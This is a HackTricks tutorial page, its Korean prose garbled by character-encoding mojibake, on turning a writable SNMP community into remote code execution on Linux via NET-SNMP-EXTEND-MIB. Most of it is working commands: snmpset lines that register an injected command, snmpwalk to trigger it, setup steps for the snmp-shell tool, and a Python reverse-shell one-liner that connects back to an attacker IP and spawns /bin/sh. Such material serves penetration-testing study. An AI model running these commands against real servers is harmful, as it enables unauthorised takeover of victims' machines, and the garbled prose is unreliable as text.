{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# SNMP RCE

SNMPëŠ” ê´€ë¦¬ìê°€ ì¥ì¹˜ë‚˜ ì„œë²„ì˜ ê¸°ë³¸ êµ¬ì„±ì„ ê°„ê³¼í•  ê²½ìš° ê³µê²©ìì— ì˜í•´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì“°ê¸° ê¶Œí•œì´ ìˆëŠ” SNMP ì»¤ë®¤ë‹ˆí‹°(rwcommunity)**ë¥¼ ì•…ìš©í•˜ì—¬ ë¦¬ëˆ…ìŠ¤ ìš´ì˜ ì²´ì œì—ì„œ ê³µê²©ìëŠ” ì„œë²„ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì¶”ê°€ ëª…ë ¹ìœ¼ë¡œ ì„œë¹„ìŠ¤ í™•ì¥

SNMP ì„œë¹„ìŠ¤ë¥¼ í™•ì¥í•˜ê³  ì¶”ê°€ ëª…ë ¹ì„ ì¶”ê°€í•˜ë ¤ë©´ "nsExtendObjects" í…Œì´ë¸”ì— ìƒˆë¡œìš´ **í–‰ì„ ì¶”ê°€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” `snmpset` ëª…ë ¹ì„ ì‚¬ìš©í•˜ê³  ì‹¤í–‰í•  ì‹¤í–‰ íŒŒì¼ì˜ ì ˆëŒ€ ê²½ë¡œì™€ ì‹¤í–‰í•  ëª…ë ¹ì„ í¬í•¨í•œ í•„ìš”í•œ ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê³µí•¨ìœ¼ë¡œì¨ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## ëª…ë ¹ì–´ ì£¼ì… ì‹¤í–‰

SNMP ì„œë¹„ìŠ¤ì—ì„œ ì‹¤í–‰í•  ëª…ë ¹ì–´ë¥¼ ì£¼ì…í•˜ë ¤ë©´ í˜¸ì¶œëœ ë°”ì´ë„ˆë¦¬/ìŠ¤í¬ë¦½íŠ¸ì˜ ì¡´ì¬ì™€ ì‹¤í–‰ ê°€ëŠ¥ì„±ì´ í•„ìš”í•©ë‹ˆë‹¤. **`NET-SNMP-EXTEND-MIB`**ëŠ” ì‹¤í–‰ íŒŒì¼ì˜ ì ˆëŒ€ ê²½ë¡œë¥¼ ì œê³µí•  ê²ƒì„ ìš”êµ¬í•©ë‹ˆë‹¤.

ì£¼ì…ëœ ëª…ë ¹ì–´ì˜ ì‹¤í–‰ì„ í™•ì¸í•˜ê¸° ìœ„í•´ `snmpwalk` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ SNMP ì„œë¹„ìŠ¤ë¥¼ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì¶œë ¥ì€ ëª…ë ¹ì–´ì™€ ê´€ë ¨ ì„¸ë¶€ì •ë³´ë¥¼ í‘œì‹œí•˜ë©°, ì ˆëŒ€ ê²½ë¡œë¥¼ í¬í•¨í•©ë‹ˆë‹¤:**
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## ì£¼ì…ëœ ëª…ë ¹ ì‹¤í–‰í•˜ê¸°

**ì£¼ì…ëœ ëª…ë ¹ì´ ì½íˆë©´ ì‹¤í–‰ë©ë‹ˆë‹¤.** ì´ ë™ì‘ì€ **`run-on-read()`**ë¡œ ì•Œë ¤ì ¸ ìˆìŠµë‹ˆë‹¤. ëª…ë ¹ì˜ ì‹¤í–‰ì€ snmpwalk ì½ê¸° ì¤‘ì— ê´€ì°°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### SNMPë¡œ ì„œë²„ ì…¸ ì–»ê¸°

ì„œë²„ë¥¼ ì œì–´í•˜ê³  ì„œë²„ ì…¸ì„ ì–»ê¸° ìœ„í•´ mxrchê°€ ê°œë°œí•œ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git)ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜ëŠ”, SNMPì— íŠ¹ì • ëª…ë ¹ì„ ì£¼ì…í•˜ì—¬ ìˆ˜ë™ìœ¼ë¡œ ë¦¬ë²„ìŠ¤ ì…¸ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ëª…ë ¹ì€ snmpwalkì— ì˜í•´ íŠ¸ë¦¬ê±°ë˜ì–´ ê³µê²©ìì˜ ë¨¸ì‹ ì— ë¦¬ë²„ìŠ¤ ì…¸ ì—°ê²°ì„ ì„¤ì •í•˜ì—¬ í”¼í•´ì ë¨¸ì‹ ì— ëŒ€í•œ ì œì–´ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ì „ì œ ì¡°ê±´ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
ë˜ëŠ” ë¦¬ë²„ìŠ¤ ì…¸:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## References
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
